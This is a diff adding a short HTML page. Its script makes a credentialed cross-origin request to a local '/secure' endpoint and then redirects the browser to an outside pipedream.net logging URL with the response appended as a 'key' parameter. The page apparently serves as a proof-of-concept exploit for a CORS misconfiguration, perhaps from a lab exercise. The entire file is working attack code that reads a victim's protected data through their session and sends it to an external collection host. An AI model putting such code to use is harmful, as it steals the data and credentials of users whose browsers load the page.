@@ -1,0 +1,15 @@
+<html>
+    <header>
+        <script>
+            var req = new XMLHttpRequest();
+            req.onload = reqListener;
+            req.open('get','http://127.0.0.1:5000/secure',true);
+            req.withCredentials = true;
+            req.send();
+
+            function reqListener() {
+                location='https://eo2jzqlm65w4rao.m.pipedream.net/log?key='+this.responseText;
+            };
+        </script>
+    </header>
+</html>
